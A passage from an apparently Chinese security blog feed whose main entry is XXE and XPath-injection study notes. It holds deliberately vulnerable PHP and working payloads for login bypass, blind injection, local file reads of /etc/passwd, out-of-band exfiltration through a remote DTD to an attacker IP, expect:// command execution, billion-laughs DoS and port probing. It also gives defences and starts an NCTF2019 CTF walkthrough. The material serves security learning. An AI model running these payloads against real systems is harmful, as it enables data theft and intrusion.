punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">App</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  request<span class="token operator">:</span> <span class="token function">promisify</span><span class="token punctuation">(</span>wx<span class="token punctuation">.</span>request<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><p><code>index.js</code>使用</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">getApp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Page</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token function-variable function">showdate</span><span class="token operator">:</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token keyword">await</span> app<span class="token punctuation">.</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>url<span class="token operator">:</span><span class="token string">'xxx'</span><span class="token punctuation">,</span>method<span class="token operator">:</span><span class="token string">'GET'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></code></pre><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://es6.ruanyifeng.com/#docs/promise">Promise 对象</a></li><li><a href="https://blog.csdn.net/weixin_44833680/article/details/102658108">微信小程序封装异步请求</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/00028cbc2e04e0ddf549d535351c13">将小程序原生异步函数promisify后，在async/await中使用</a></li><li><a href="https://developers.weixin.qq.com/community/develop/article/doc/000ceaee71c9d09ae5b8c77d151813">微信小程序中使用Async/Await方法异步请求变为同步请求</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;方法不唯一，后续有新方法再补上~&lt;/p&gt;
    
    </summary>
    
    
      <category term="开发" scheme="https://www.extrader.top/categories/%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="JavaScript" scheme="https://www.extrader.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>XXE学习笔记</title>
    <link href="https://www.extrader.top/posts/55c267c8/"/>
    <id>https://www.extrader.top/posts/55c267c8/</id>
    <published>2020-08-11T02:06:34.000Z</published>
    <updated>2020-08-18T02:56:23.372Z</updated>
    
    <content type="html"><![CDATA[    <div id="aplayer-oRnOkvXS" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="5174564734" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="none" data-theme="#ad7a86"></div><span id="more"></span><h3 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h3><p>XPath注入对象是一个存储数据的XML文件</p><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p><strong>index.xml</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>users</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>rootpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>adminpwd<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>users</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p><strong>index.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span><span class="token operator">=</span><span class="token function">simplexml_load_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$name</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pwd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"/root/users/user[username/text()='"</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' and password/text()='"</span><span class="token operator">.</span><span class="token variable">$pwd</span><span class="token operator">.</span><span class="token string double-quoted-string">"']"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token variable">$xml</span><span class="token operator">-></span><span class="token function">xpath</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h2>Welcome&lt;/h2>'</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />ID:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">id</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br />Username:'</span><span class="token operator">.</span><span class="token variable">$value</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><h4 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h4><p><strong>payload</strong></p><p><code>?name=&#39; or 1=1 or &#39;&#39;=&#39;&amp;pwd=1</code>，结果如下，类似sql注入，绕过了xml查询</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811093843233.png" alt loading="lazy"></p><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p><strong>payload</strong></p><p>有返回结果则为正确</p><pre class="language-xml" data-language="xml"><code class="language-xml">推测根节点数，有返回结果则说明只有一个根节点' or count(/*) = 1 or '1' = '2  猜解一级节点' or substring(name(/*[position() = 1]),1,1)='r' or '1'='2  ' or substring(name(/*[position() = 1]),1,1)='o' or '1'='2  ......推测root的下一级节点数' or count(/root/*) = 1 or '1' = '2猜解root的下一级节点' or substring(name(/root/*[position() = 1]),1,1)='u' or '1'='2' or substring(name(/root/*[position() = 1]),1,1)='s' or '1'='2......猜解节点中的数据' or /root/users/user[1]/username[contains(text(),'r')] or '1'='2  ' or /root/users/user[1]/username[contains(text(),'ro')] or '1'='2  ......</code></pre><ul><li><code>/ ：</code>从根节点选取</li><li><code>// ：</code>从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置</li><li><code>. ：</code>选取当前节点</li><li><code>.. ：</code>选取当前节点的父节点</li></ul><h3 id="XML外部实体注入-XXE"><a href="#XML外部实体注入-XXE" class="headerlink" title="XML外部实体注入(XXE)"></a>XML外部实体注入(XXE)</h3><blockquote><p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成<strong>任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击</strong>等危害。</p><p>XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p></blockquote><blockquote><p>XXE的造成与PHP版本无关，与libxml库的版本有关。libxml &lt;= 2.9.0中，默认启用了外部实体，libxml&gt;2.9.0中默认仅用了外部实体。XXE并不是直接由libxml库造成的，libxml库提供了一些XML核心功能，包括禁用外部实体的libxml_disable_entity_loader()函数，SimpleXML库提供了解析XML的函数，SimpleXML库依赖于libxml库。</p></blockquote><p>本地测试环境php.4.45   libxml = 2.7.8</p><p>外部实体可支持http、file等协议。不同程序支持的协议不同</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811110816675.png" alt loading="lazy"></p><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><strong>payload</strong></p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///d://flag.txt" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>url编码后给传入，即在 xml 中 <code>&amp;file ;</code> 变成了外部文件<code>qwzf.txt</code>中内容，导致敏感信息泄露。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811102323743.png" alt loading="lazy"></p><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><p><strong>xxe.php</strong></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// print_r($xml);</span><span class="token delimiter important">?></span></span></code></pre><p>这种情况就需要将数据发送到远程服务器(攻击服务器)</p><p><strong>payload</strong></p><p><strong>传入的xml</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;%send;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>另一种方式<span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % dtd SYSTEM "http://172.18.104.218/xxe.dtd">%dtd;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre><p><strong>远程服务器的xxe.dtd文件</strong>    两种方式</p><pre class="language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218/?content=%file;'>">%payload;另一种方式：&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=D:/flag.txt">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> send SYSTEM 'http://172.18.104.218:5000/?content=%file;'>">%int;%send;</code></pre><p>将xml进行url编码后传入</p><p>再查看远程服务器的apache日志文件</p><p><code>cat /var/log/apache2/access.log</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811104737190.png" alt loading="lazy"></p><p><code>nc -lvp 5000</code>  端口监听</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200811111337248.png" alt loading="lazy"></p><p>解码后即是文件的内容</p><p>攻击流程</p><ul><li>先调用<code>%dtd</code>，请求远程服务器(攻击服务器)上的<code>evil.dtd</code>。</li><li>再调用 <code>evil.dtd</code>中的 <code>%file</code>。<code>%file</code> 获取受攻击的服务器上面的敏感文件，然后将 <code>%file</code> 的返回结果传到<code>%send</code> 。</li><li>然后调用 <code>%send;</code> 把读取到的数据发送到远程服务器上。</li></ul><h4 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h4><p>在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "expect://id" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>通过XXE可以实现RCE的实例很少。</p><h4 id="拒绝服务攻击-Dos"><a href="#拒绝服务攻击-Dos" class="headerlink" title="拒绝服务攻击(Dos)"></a>拒绝服务攻击(Dos)</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>   <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">lolz</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol</span> <span class="token attr-name">"lol"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol2</span> <span class="token attr-name">"&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol3</span> <span class="token attr-name">"&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol4</span> <span class="token attr-name">"&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol5</span> <span class="token attr-name">"&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol6</span> <span class="token attr-name">"&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol7</span> <span class="token attr-name">"&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol8</span> <span class="token attr-name">"&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">lol9</span> <span class="token attr-name">"&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"</span><span class="token punctuation">></span></span></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lolz</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&lol9;">&amp;lol9;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lolz</span><span class="token punctuation">></span></span></code></pre><p><strong>原理</strong>：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9。</p><h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p><strong>使用开发语言提供的禁用外部实体的方法</strong></p><p>php:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>java:</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">DocumentBuilderFactory</span> dbf <span class="token operator">=</span><span class="token class-name">DocumentBuilderFactory</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dbf<span class="token punctuation">.</span><span class="token function">setExpandEntityReferences</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Python:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etreexmlData <span class="token operator">=</span> etree<span class="token punctuation">.</span>parse<span class="token punctuation">(</span>xmlSource<span class="token punctuation">,</span>etree<span class="token punctuation">.</span>XMLParser<span class="token punctuation">(</span>resolve_entities<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><strong>过滤用户提交的XML数据</strong></p><p>过滤关键字：<code>&lt;\!DOCTYPE</code>和<code>&lt;\!ENTITY</code>，或者<code>SYSTEM</code>和<code>PUBLIC</code>。</p><p><strong>不允许XML中含有自己定义的DTD</strong></p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h4><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/XXE学习笔记/image-20200817204320669.png" style="zoom:80%;" loading="lazy"><p>题目提示<code>xml</code>，推测是<code>xxe</code>，于是<code>login</code>抓包，发现提交<code>username</code>和<code>password</code>是以一个<code>xml</code>格式的数据提交的，如下：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span>admin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123456<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>于是进行<code>xxe</code>注入测试：</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY file SYSTEM "file:///etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&file;">&amp;file;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p>回显<code>/etc/passwd</code>的内容，存在<code>xxe</code>注入，尝试读取文件，得到<code>doLogin.php</code>的代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*** autor: c0ny1* date: 2018-2-7*/</span><span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span><span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'024b87931a03f738fff6693ce0a78c88'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token 